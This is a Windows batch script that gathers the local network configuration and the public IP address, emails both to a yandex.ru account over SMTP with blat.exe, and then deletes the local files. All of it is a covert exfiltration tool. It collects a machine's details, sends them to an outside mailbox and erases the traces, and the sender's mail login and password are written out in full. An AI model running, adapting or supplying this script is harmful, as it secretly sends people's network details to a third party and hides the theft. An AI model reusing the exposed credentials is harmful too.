@echo off

ipconfig /all > localip.txt
realip.exe > realip.txt

ping -n 2 127.0.0.1 > nul

blat.exe -install -server smtp.yandex.ru -port 587 -f pupup2011@yandex.ru -u pupup2011 -pw n140200n
blat.exe -to pupup2011@yandex.ru -subject "Local IP" -attachi "localip.txt" -body "Locals IP"
blat.exe -to pupup2011@yandex.ru -subject "Real IP" -attachi "realip.txt" -body "Real IP"

del /f /q localip.txt
del /f /q realip.txt